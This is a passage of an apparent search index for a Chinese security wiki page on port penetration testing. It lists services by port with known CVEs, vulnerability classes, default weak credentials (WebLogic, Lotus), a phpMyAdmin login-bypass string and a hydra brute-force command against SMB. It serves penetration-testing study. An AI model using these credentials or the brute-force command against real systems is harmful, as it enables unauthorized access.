\u5907\u6ce8\uff1a\u865a\u62df\u673a\u4e2d\u9700\u8981\u8fd8\u539f\u9ed8\u8ba4\u8bbe\u7f6e\u624d\u4f1a\u6e05\u9664macof\u7684\u653b\u51fb\u6548\u679c","title":"macof"},{"location":"red_vs_blue/port/","text":"\u7aef\u53e3\u6e17\u900f update_time\uff1a2019/08/28 Web\u670d\u52a1\u7aef\u53e3\u6e17\u900f Apache/Axis2\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a80/8080 Apache Manager\u540e\u53f0\u5f31\u53e3\u4ee4\uff1a Apache \u89e3\u6790\u6f0f\u6d1e\uff1a Apache \u6162\u901f\u653b\u51fb\uff1a CVE-2019-0211\uff1aApache HTTP Server \u7ec4\u4ef6\u63d0\u6743 Confluence\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a8080 CVE-2019-3398\uff1a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c GlassFish\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a3700\uff08IIOP\u7aef\u53e3\uff09\u30014848\uff08GlassFish\u63a7\u5236\u53f0\u7aef\u53e3\uff09\u30018080\uff08GlassFiash HTTP\u7aef\u53e3\uff09 GlassFish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 GlassFish \u8ba4\u8bc1\u7ed5\u8fc7\uff1a Oracle GlassFish Server\u8ba4\u8bc1\u7ed5\u8fc7 GlassFish \u5f31\u53e3\u4ee4 IIS\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a80/443 IIS PUT\u5199\u6587\u4ef6\uff1a IIS \u77ed\u6587\u4ef6\u540d\u6cc4\u6f0f\uff1a IIS_shortname_Scanner GitHub\u5730\u5740 IIS \u89e3\u6790\u6f0f\u6d1e\uff1a JBoss\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a1098/1099/4444/4445/8009/8080/8083/8093 JBoss \u53cd\u5e8f\u5217\u5316\uff1a /invoker/JMXInvokerServlet JBoss \u540e\u53f0GetShell\uff1a \u540e\u53f0\u90e8\u7f72war\u5305GetShell JBoss \u5f31\u53e3\u4ee4\uff1ajmx-console\u5f31\u53e3\u4ee4\u3001admin-console\u5f31\u53e3\u4ee4 JBoss \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1aCVE-2013-4810 Jenkins\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a8080/8089 CVE-2018-1999002\uff1aJenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 CVE-2019-1003000\uff1aJenkins\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c Jenkins \u53cd\u5e8f\u5217\u5316 Jenkins \u5f31\u53e3\u4ee4 Jenkins \u672a\u6388\u6743\u8bbf\u95ee Jetty\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a8080 \u8fdc\u7a0b\u5171\u4eab\u7f13\u51b2\u533a\u6ea2\u51fa \u654f\u611f\u4fe1\u606f\u6cc4\u6f0f\uff1a CVE-2018-12536 Lotus\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a1352 Lotus \u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff1a Lotus \u5f31\u53e3\u4ee4\uff1aadmin/password Lotus \u4fe1\u606f\u6cc4\u6f0f\uff1a Resin\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a8080 Resin \u76ee\u5f55\u904d\u5386 Resin \u8fdc\u7a0b\u6587\u4ef6\u8bfb\u53d6 WebLogic\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a7001 WebLogic Console\u540e\u53f0\u5f31\u53e3\u4ee4\uff1asystem/system\u3001weblogic/weblogic\u3001weblogic/weblogic123\u3001portaladmin/portaladmin\u3001guest/guest WebLogic Console\u540e\u53f0\u90e8\u7f72WebShell\uff1a WebLogic SSRF\uff1a WebLogic \u53cd\u5e8f\u5217\u5316\uff1a WebLogic \u6cc4\u6f0f\u6e90\u4ee3\u7801\u4e0e\u76ee\u5f55\u904d\u5386\uff1a WebSphere\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a908N\uff0cN\u662f1-9\u7684\u6b63\u6574\u6570\uff0c\u4ee3\u8868\u7b2c\u51e0\u4e2a\u5e94\u7528 WebSpere \u53cd\u5e8f\u5217\u5316 WebSpere \u4efb\u610f\u6587\u4ef6\u6cc4\u6f0f\uff1aCVE-2014-0823 WebSpere \u5f31\u53e3\u4ee4 Zabbix\u7aef\u53e3\u6e17\u900f \u7aef\u53e3\u53f7\uff1a8069 \u5e38\u89c1\u6f0f\u6d1e \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u6ce8\u5165\u6f0f\u6d1e\uff1a Zabbix\u7684\u524d\u53f0SQL\u6ce8\u5c04\u6f0f\u6d1e\u5229\u7528 \u5e38\u89c1\u7aef\u53e3\u6e17\u900f DHCP\uff1a\u7aef\u53e3\u6e17\u900f 67\uff1adhcp/bootp\uff08Dynamic Host Configuration Protocol \u52a8\u6001\u4e3b\u673a\u8bbe\u7f6e\u534f\u8bae\uff09 68\uff1adhcp/bootp\uff08\u52a8\u6001\u4e3b\u673a\u8bbe\u7f6e\u534f\u8bae\uff09 546\uff1adhcpv6 547\uff1adhcpv6 \u5e38\u89c1\u6f0f\u6d1e DHCP\u6b3a\u9a97\uff1a \u6d41\u6c13DHCP\u670d\u52a1\u5668\u5185\u7f51\u653b\u51fb\u6d4b\u8bd5 DNS\u7aef\u53e3\u6e17\u900f 53\uff1adns\uff08Domain Name System\u57df\u540d\u670d\u52a1\uff09 \u5e38\u89c1\u6f0f\u6d1e DNS\u7f13\u51b2\u533a\u6ea2\u51fa DNS\u6b3a\u9a97\uff1aDNS\u7f13\u5b58\u6c61\u67d3\u3001DNS\u52ab\u6301\u3001DNS\u91cd\u5b9a\u5411 DNS\u4fe1\u606f\u6cc4\u6f0f \u5229\u7528DNS\u96a7\u9053\u6280\u672f\u7a7f\u900f\u9632\u706b\u5899\uff1b \u533a\u57df\u4f20\u8f93\u6f0f\u6d1e\uff1b \u90ae\u4ef6\u672a\u914d\u7f6eSPF\u5bfc\u81f4\u53d1\u4ef6\u4eba\u4fe1\u606f\u4f2a\u9020\uff1b Linux R\u7aef\u53e3\u6e17\u900f 512/tcp\uff1arexec 513/login\uff1arlogin \u5e38\u89c1\u6f0f\u6d1e \u76f4\u63a5\u767b\u5f55\uff1a Metasploitable2\u4f7f\u7528\u6307\u5357 Rsync\u7aef\u53e3\u6e17\u900f 873\uff1arsync\uff08\u6587\u4ef6\u540c\u6b65\u534f\u8bae\uff09 \u5e38\u89c1\u6f0f\u6d1e \u672a\u6388\u6743\u8bbf\u95ee SNMP\u7aef\u53e3\u6e17\u900f 161\uff1asnmp\uff08Simple Network Managerment Protocol\u7b80\u5355\u7f51\u7edc\u7ba1\u7406\u534f\u8bae\uff09 162\uff1asnmp\uff08SNMP\u534f\u8bae\u7684TRAP\u64cd\u4f5c\uff09 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3 \u5176\u5b83\u7aef\u53e3 43\uff1awhois\uff08\uff09 49\uff1aTACACS\uff08\uff09 70\uff1aGopher\uff08\uff09 79\uff1aFinger\uff08\uff09 88/464\uff1aKerberos\uff08\uff09 123\uff1antp\uff08Network Time Protocol\u7f51\u7edc\u65f6\u95f4\u534f\u8bae\uff09 135\uff1aMicrosoft RPC 153\uff1aSGMP\uff08Simple Gateway Monitoring Protocol \u7b80\u5355\u7f51\u5173\u76d1\u63a7\u534f\u8bae\uff09 179\uff1aBGP\uff08Border Gateway Protocol \u8fb9\u754c\u7f51\u5173\u534f\u8bae\uff09 445\uff1aMicrosoft DS 264\uff1aBGMP\uff08Border Gateway Multicast Protocol \u8fb9\u754c\u7f51\u5173\u7ec4\u64ad\u534f\u8bae\uff09 514\uff1asyslog\uff08\u65e5\u5fd7\u670d\u52a1\uff09 631\uff1ainternet printing\uff08\u4e92\u8054\u7f51\u6253\u5370\u670d\u52a1\uff09 691\uff1aMS Exchange 1025\uff1aMicrosoft RPC 1080\uff1aSOCKS Proxy 1194\uff1aOpenVPN 1812/1813\uff1aRADIUS \u5927\u6570\u636e\u670d\u52a1\u7aef\u53e3\u6e17\u900f CDH\u7aef\u53e3\u6e17\u900f 7180\uff1aCloudera Manager WebUI\u7aef\u53e3 7182\uff1aCloudera Manager Server\u4e0eAgent\u901a\u4fe1\u7aef\u53e3 ElasticSearch\u7aef\u53e3\u6e17\u900f 9200\uff1a\u5ba2\u6237\u7aef\u4f7f\u7528http\u8fde\u63a5es\u7684\u7aef\u53e3 9300\uff1a\u5ba2\u6237\u7aef\u4f7f\u7528tcp\u8fde\u63a5es\u7684\u7aef\u53e3 \u5e38\u89c1\u6f0f\u6d1e WebShell\u690d\u5165\uff1a \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a9200\u7aef\u53e3\u9ed8\u8ba4\u65e0\u8ba4\u8bc1\u4fe1\u606f\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6ES\u7684\u96c6\u7fa4\u4fe1\u606f\uff1b \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff1aCVE-2014-3120\u3001 CVE-2015-1427\uff1aElasticSearch Groovy\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c Hadoop\u7aef\u53e3\u6e17\u900f 50070\uff1aHDFS\u7684WebUI\u7aef\u53e3 8020\uff1a\u9ad8\u53ef\u7528\u7684HDFS RPC\u7aef\u53e3 9000\uff1a\u975e\u9ad8\u53ef\u7528\u7684HDFS RPC\u7aef\u53e3 8088\uff1aYarn\u7684WebUI\u7aef\u53e3 8485\uff1aJournalNode\u7684RPC\u7aef\u53e3 8019\uff1aZKFC\u7aef\u53e3 \u5e38\u89c1\u6f0f\u6d1e CVE-2018-8029\uff1aApache Hadoop \u6743\u9650\u63d0\u5347\u6f0f\u6d1e Hadoop Yarn REST API\u672a\u6388\u6743\u6f0f\u6d1e\u5229\u7528\u6316\u77ff\u5206\u6790 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u672a\u6388\u6743\u8bbf\u95ee\uff1a HBase\u7aef\u53e3\u6e17\u900f 60010\uff1aHBase Master\u7684WebUI\u7aef\u53e3 60030\uff1aHBase RegionServer\u7684WebUI\u7aef\u53e3 \u6f0f\u6d1e\u6848\u4f8b \u4fee\u590d\u610f\u89c1 Hive\u7aef\u53e3\u6e17\u900f 9083\uff1aHive Metastore\u670d\u52a1\u9ed8\u8ba4\u76d1\u542c\u7aef\u53e3 10000\uff1aHive\u7684JDBC\u7aef\u53e3 \u6f0f\u6d1e\u6848\u4f8b \u4fee\u590d\u610f\u89c1 Hue\u7aef\u53e3\u6e17\u900f 8888\uff1aHue WebUI\u7aef\u53e3 \u6f0f\u6d1e\u6848\u4f8b \u4fee\u590d\u610f\u89c1 Kafka\u7aef\u53e3\u6e17\u900f 9092\uff1aKafka\u96c6\u7fa4\u8282\u70b9\u4e4b\u95f4\u901a\u4fe1\u7684RPC\u7aef\u53e3 \u6f0f\u6d1e\u6848\u4f8b \u4fee\u590d\u610f\u89c1 Kibana 5601\uff1aKibana Memcache\u7aef\u53e3\u6e17\u900f 11211\uff1aMemcache\uff08\u5206\u5e03\u5f0f\u7684\u9ad8\u901f\u7f13\u5b58\u7cfb\u7edf\uff09 \u5e38\u89c1\u6f0f\u6d1e \u672a\u6388\u6743\u8bbf\u95ee\uff1a Memcached\u670d\u52a1\u5b89\u5168\u52a0\u56fa Spark\u7aef\u53e3\u6e17\u900f 7077\uff1aSpark\u7684Master\u4e0eWorker\u8fdb\u884c\u901a\u4fe1\u7684\u7aef\u53e3\uff1bStandalone\u96c6\u7fa4\u63d0\u4ea4Application\u7684\u7aef\u53e3 8080\uff1aSpark Master\u7684WebUI\u7aef\u53e3 8081\uff1aSpark Worker\u7684WebUI\u7aef\u53e3 4040\uff1aSpark Driver\u7684WebUI\u7aef\u53e3 18080\uff1aSpark History Server\u7684WebUI\u7aef\u53e3 Zookeeper\u7aef\u53e3\u6e17\u900f 2181\uff1a\u5ba2\u6237\u7aef\u94fe\u63a5Zookeeper\u7684\u7aef\u53e3 2888\uff1aZookeeper\u96c6\u7fa4\u5185\u901a\u4fe1\u7aef\u53e3\uff0cLeader\u76d1\u542c\u6b64\u7aef\u53e3 3888\uff1aZookeeper\u9009\u4e3eLeader\u7aef\u53e3 \u5e38\u89c1\u6f0f\u6d1e \u672a\u6388\u6743\u8bbf\u95ee \u6570\u636e\u5e93\u670d\u52a1\u7aef\u53e3\u6e17\u900f DB2\u7aef\u53e3\u6e17\u900f 5000\uff1a \u5e38\u89c1\u6f0f\u6d1e \u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u540e\u672a\u6388\u6743\u8bbf\u95ee\uff1aCVE-2015-1922 MongoDB\u6570\u636e\u5e93 27017 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a mongodb_unauth_access \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1a MongoDB phpMoAdmin\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 MSSQL\u7aef\u53e3\u6e17\u900f 1433/tcp\uff1aMicrosoft SQL\uff08MSSQL\u6570\u636e\u5e93\uff09 1434/tcp\uff1aMicrosoft SQL\uff08MSSQL\u6d3b\u52a8\u76d1\u89c6\u5668\uff09 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u6743\u9650\u63d0\u5347\uff1a \u4ece\u653b\u51fbMSSQL Server\u5230\u83b7\u5f97\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650 MySQL\u7aef\u53e3\u6e17\u900f 3306\uff1aMySQL \u5e38\u89c1\u6f0f\u6d1e phpmyadmin\u4e07\u80fd\u5bc6\u7801\uff1a'localhost'@'@\"/\u5bc6\u7801\u4efb\u610f \u66b4\u529b\u7834\u89e3 \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u6743\u9650\u63d0\u5347\uff1a MYSQL\u63d0\u6743\u603b\u7ed3 \u8eab\u4efd\u8ba4\u8bc1\u6f0f\u6d1e\uff1a CVE-2012-2122 Oracle\u7aef\u53e3\u6e17\u900f 1521\uff1aOracle\u6570\u636e\u5e93\u7aef\u53e3 1158 8080 2100\uff1aOracle XDB 2483/2484\uff1aOralce DB \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u6f0f\u6d1e\u653b\u51fb PostgreSQL\u7aef\u53e3\u6e17\u900f 5432\uff1aPostgreSQL \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u7f13\u51b2\u533a\u6ea2\u51fa\uff1aCVE-2014-2669 Redis\u7aef\u53e3\u6e17\u900f 6379\uff1aRedis \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a \u4e00\u8d77\u653b\u51fb\u8005\u5229\u7528Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u8fdb\u884c\u65b0\u578b\u5165\u4fb5\u6316\u77ff\u4e8b\u4ef6 SysBase\u7aef\u53e3\u6e17\u900f 5000 4100 4200 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u547d\u4ee4\u6ce8\u5165\uff1a \u6587\u4ef6\u670d\u52a1\u7aef\u53e3\u6e17\u900f FTP\u7aef\u53e3\u6e17\u900f 20\uff1aftp\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\u9ed8\u8ba4\u6570\u636e\uff09 21\uff1aftp\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\u63a7\u5236\uff09 69\uff1atftp\uff08\u5c0f\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 115\uff1asftp\uff08\u5b89\u5168\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 989\uff1aftp over ssl 990\uff1aftp over ssl \u5e38\u89c1\u6f0f\u6d1e FTP \u540e\u95e8\uff1a Metasploitable2\u4f7f\u7528\u6307\u5357 \u66b4\u529b\u7834\u89e3\uff1ahydra\uff1b \u5c40\u57df\u7f51\u55c5\u63a2ftp\u5bc6\u7801\uff1b \u533f\u540d\u8bbf\u95ee\uff1aanonymous/\uff08\u4e3a\u7a7a\u6216\u4efb\u610f\u90ae\u7bb1\uff09\uff1b \u8df3\u8f6c\u653b\u51fb(Bounce Attacks)\uff1a\u653b\u51fb\u8005\u53d1\u9001\u4e00\u4e2aFTP\"PORT\"\u547d\u4ee4\u7ed9\u76ee\u6807FTP\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542b\u8be5\u4e3b\u673a\u7684\u7f51\u7edc\u5730\u5740\u548c\u88ab\u653b\u51fb\u7684\u670d\u52a1\u7684\u7aef\u53e3\u53f7\u3002\u8fd9\u6837\uff0c\u5ba2\u6237\u7aef\u5c31\u80fd\u547d\u4ee4FTP\u670d\u52a1\u5668\u53d1\u4e00\u4e2a\u6587\u4ef6\u7ed9\u88ab\u653b\u51fb\u7684\u670d\u52a1\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u80fd\u5305\u62ec\u6839\u88ab\u653b\u51fb\u7684\u670d\u52a1\u6709\u5173\u7684\u547d\u4ee4\uff08\u5982SMTP,NNTP\u7b49\uff09\u3002\u7531\u4e8e\u662f\u547d\u4ee4\u7b2c\u4e09\u65b9\u53bb\u8fde\u63a5\u5230\u4e00\u79cd\u670d\u52a1\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fde\u63a5\uff0c\u5c31\u4f7f\u5f97\u8ddf\u8e2a\u653b\u51fb\u8005\u53d8\u5f97\u56f0\u96be\uff0c\u5e76\u4e14\u8fd8\u907f\u5f00\u4e86\u57fa\u4e8e\u7f51\u7edc\u5730\u5740\u7684\u8bbf\u95ee\u9650\u5236\u3002 \u672a\u6388\u6743\u8bbf\u95ee\uff1a\u4e0d\u9700\u8981\u8d26\u53f7\u4e0e\u5bc6\u7801\uff1b \u8fdc\u7a0b\u6ea2\u51fa\uff1a6.10.1 IIS FTP\uff0c\u5728IIS FTP\u670d\u52a1\u5668\u4e2dNLST\u547d\u4ee4\u5b58\u5728\u4e00\u4e2a\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u80fd\u662f\u653b\u51fb\u8005\u5728\u670d\u52a1\u5668\u8fd0\u884c\u4e00\u6761\u975e\u6cd5\u547d\u4ee4\u3002 LDAP\u7aef\u53e3\u6e17\u900f 389\uff1aldap\uff08Lightweight Directory Access Protocol \u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09 636\uff1aldap over ssl \u5e38\u89c1\u6f0f\u6d1e LDAP \u6ce8\u5165\uff1a \u66b4\u529b\u7834\u89e3\uff1a \u672a\u6388\u6743\u8bbf\u95ee\uff1a NFS\u7aef\u53e3\u6e17\u900f 2049\uff1anfs\uff08network file system \u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff09 \u5e38\u89c1\u6f0f\u6d1e \u672a\u6388\u6743\u8bbf\u95ee\uff1a NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e Samba\u7aef\u53e3\u6e17\u900f 137\uff1aNetBIOS Name Service\uff0cNetBIOS\u540d\u79f0\u670d\u52a1\u7aef\u53e3 138\uff1aNetBIOS\u6570\u636e\u62a5\u6587\u670d\u52a1\u7aef\u53e3 139\uff1aNetBIOS Session Service\uff0cNetBIOS\u4f1a\u8bdd\u670d\u52a1\u7aef\u53e3 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1ahydra -l username -P pass_file attack_ip smb \u672a\u6388\u6743\u8bbf\u95ee\uff1a\u8d4b\u4e88public\u7528\u6237\u8fc7\u9ad8\u7684\u6743\u9650\uff1b \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1aCVE-2015-0240\uff1b \u90ae\u4ef6\u670d\u52a1\u7aef\u53e3\u6e17\u900f IAMP\u7aef\u53e3\u6e17\u900f 143\uff1aiamp4\uff08\u56e0\u7279\u7f51\u4fe1\u606f\u8bbf\u95ee\u534f\u8bae\uff09 993\uff1aiamp4 over ssl \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3 \u914d\u7f6e\u4e0d\u5f53 POP\u7aef\u53e3\u6e17\u900f 109\uff1apop2\uff08\u90ae\u5c40\u534f\u8baev2\uff09 110\uff1apop3\uff08\u90ae\u5c40\u534f\u8baev3\uff09 995\uff1apop3 over ssl \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3 \u672a\u6388\u6743\u8bbf\u95ee SMTP\u7aef\u53e3\u6e17\u900f 25\uff1asmtp\uff08Simple Mail Transfer Protocol \u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 465\uff1asmtps\uff08smtp over ssl\uff09 587\uff1asmtp\uff08Simple Mail Transfer Protocol \u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3 \u672a\u6388\u6743\u8bbf\u95ee \u8fdc\u7a0b\u8bbf\u95ee\u670d\u52a1\u7aef\u53e3\u6e17\u900f Microsoft RDP\u7aef\u53e3\u6e17\u900f 3389\uff1aMicrosoft Terminal Server \u5e38\u89c1\u6f0f\u6d1e CVE-2019-0708\uff1a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c MS12-020\uff1a Shift\u7c98\u6ede\u952e\u540e\u95e8\uff0c5\u6b21Shift\uff1b \u66b4\u529b\u7834\u89e3 pcAnywhere\u7aef\u53e3\u6e17\u900f 5631/5632\uff1apcAnywhere \u5e38\u89c1\u6f0f\u6d1e \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u6743\u9650\u63d0\u5347 SSH\u7aef\u53e3\u6e17\u900f 22\uff1assh\uff08\u8fdc\u7a0b\u767b\u5f55\u534f\u8bae\uff09 \u5e38\u89c1\u6f0f\u6d1e 28\u9000\u683c\u6f0f\u6d1e\uff1a \u66b4\u529b\u7834\u89e3\uff1a \u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e\uff1a Telnet\u7aef\u53e3\u6e17\u900f 23\uff1atelnet\uff08\u7ec8\u7aef\u4eff\u771f\u534f\u8bae\uff09 \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3\uff1a \u5c40\u57df\u7f51\u55c5\u63a2\uff1a VNC\u7aef\u53e3\u6e17\u900f 5500\uff1aVNC Server 590N\uff1aN\u662f\u4ece1\u52309\u7684\u6574\u6570\uff0c\u4ee3\u8868\u4e0d\u540c\u5230\u684c\u9762ID \u5e38\u89c1\u6f0f\u6d1e \u66b4\u529b\u7834\u89e3 \u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff1aCVE-2015-5239 \u6743\u9650\u63d0\u5347\uff1aCVE-2013-6886 \u8ba4\u8bc1\u53e3\u4ee4\u7ed5\u8fc7 \u53c2\u8003\u8d44\u6599 bloodzer0-\u7aef\u53e3\u6e17\u900f\u603b\u7ed3","title":"\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_1","text":"update_time\uff1a2019/08/28","title":"\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#web","text":"","title":"Web\u670d\u52a1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#apacheaxis2","text":"\u7aef\u53e3\u53f7\uff1a80/8080 Apache Manager\u540e\u53f0\u5f31\u53e3\u4ee4\uff1a Apache \u89e3\u6790\u6f0f\u6d1e\uff1a Apache \u6162\u901f\u653b\u51fb\uff1a CVE-2019-0211\uff1aApache HTTP Server \u7ec4\u4ef6\u63d0\u6743","title":"Apache/Axis2\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#confluence","text":"\u7aef\u53e3\u53f7\uff1a8080 CVE-2019-3398\uff1a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","title":"Confluence\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#glassfish","text":"\u7aef\u53e3\u53f7\uff1a3700\uff08IIOP\u7aef\u53e3\uff09\u30014848\uff08GlassFish\u63a7\u5236\u53f0\u7aef\u53e3\uff09\u30018080\uff08GlassFiash HTTP\u7aef\u53e3\uff09 GlassFish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 GlassFish \u8ba4\u8bc1\u7ed5\u8fc7\uff1a Oracle GlassFish Server\u8ba4\u8bc1\u7ed5\u8fc7 GlassFish \u5f31\u53e3\u4ee4","title":"GlassFish\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#iis","text":"\u7aef\u53e3\u53f7\uff1a80/443 IIS PUT\u5199\u6587\u4ef6\uff1a IIS \u77ed\u6587\u4ef6\u540d\u6cc4\u6f0f\uff1a IIS_shortname_Scanner GitHub\u5730\u5740 IIS \u89e3\u6790\u6f0f\u6d1e\uff1a","title":"IIS\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#jboss","text":"\u7aef\u53e3\u53f7\uff1a1098/1099/4444/4445/8009/8080/8083/8093 JBoss \u53cd\u5e8f\u5217\u5316\uff1a /invoker/JMXInvokerServlet JBoss \u540e\u53f0GetShell\uff1a \u540e\u53f0\u90e8\u7f72war\u5305GetShell JBoss \u5f31\u53e3\u4ee4\uff1ajmx-console\u5f31\u53e3\u4ee4\u3001admin-console\u5f31\u53e3\u4ee4 JBoss \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1aCVE-2013-4810","title":"JBoss\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#jenkins","text":"\u7aef\u53e3\u53f7\uff1a8080/8089 CVE-2018-1999002\uff1aJenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 CVE-2019-1003000\uff1aJenkins\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c Jenkins \u53cd\u5e8f\u5217\u5316 Jenkins \u5f31\u53e3\u4ee4 Jenkins \u672a\u6388\u6743\u8bbf\u95ee","title":"Jenkins\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#jetty","text":"\u7aef\u53e3\u53f7\uff1a8080 \u8fdc\u7a0b\u5171\u4eab\u7f13\u51b2\u533a\u6ea2\u51fa \u654f\u611f\u4fe1\u606f\u6cc4\u6f0f\uff1a CVE-2018-12536","title":"Jetty\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#lotus","text":"\u7aef\u53e3\u53f7\uff1a1352 Lotus \u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff1a Lotus \u5f31\u53e3\u4ee4\uff1aadmin/password Lotus \u4fe1\u606f\u6cc4\u6f0f\uff1a","title":"Lotus\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#resin","text":"\u7aef\u53e3\u53f7\uff1a8080 Resin \u76ee\u5f55\u904d\u5386 Resin \u8fdc\u7a0b\u6587\u4ef6\u8bfb\u53d6","title":"Resin\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#weblogic","text":"\u7aef\u53e3\u53f7\uff1a7001 WebLogic Console\u540e\u53f0\u5f31\u53e3\u4ee4\uff1asystem/system\u3001weblogic/weblogic\u3001weblogic/weblogic123\u3001portaladmin/portaladmin\u3001guest/guest WebLogic Console\u540e\u53f0\u90e8\u7f72WebShell\uff1a WebLogic SSRF\uff1a WebLogic \u53cd\u5e8f\u5217\u5316\uff1a WebLogic \u6cc4\u6f0f\u6e90\u4ee3\u7801\u4e0e\u76ee\u5f55\u904d\u5386\uff1a","title":"WebLogic\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#websphere","text":"\u7aef\u53e3\u53f7\uff1a908N\uff0cN\u662f1-9\u7684\u6b63\u6574\u6570\uff0c\u4ee3\u8868\u7b2c\u51e0\u4e2a\u5e94\u7528 WebSpere \u53cd\u5e8f\u5217\u5316 WebSpere \u4efb\u610f\u6587\u4ef6\u6cc4\u6f0f\uff1aCVE-2014-0823 WebSpere \u5f31\u53e3\u4ee4","title":"WebSphere\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#zabbix","text":"\u7aef\u53e3\u53f7\uff1a8069","title":"Zabbix\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#_2","text":"\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u6ce8\u5165\u6f0f\u6d1e\uff1a Zabbix\u7684\u524d\u53f0SQL\u6ce8\u5c04\u6f0f\u6d1e\u5229\u7528","title":"\u5e38\u89c1\u6f0f\u6d1e"},{"location":"red_vs_blue/port/#_3","text":"","title":"\u5e38\u89c1\u7aef\u53e3\u6e17\u900f"},{"location":"red_vs_blue/port/#dhcp","text":"67\uff1adhcp/bootp\uff08Dynamic Host Configuration Protocol \u52a8\u6001\u4e3b\u673a\u8bbe\u7f6e\u534f\u8bae\uff09 68\uff1adhcp/bootp\uff08\u52a8\u6001\u4e3b\u673a\u8bbe\u7f6e\u534f\u8bae\uff09 546\uff1adhcpv6 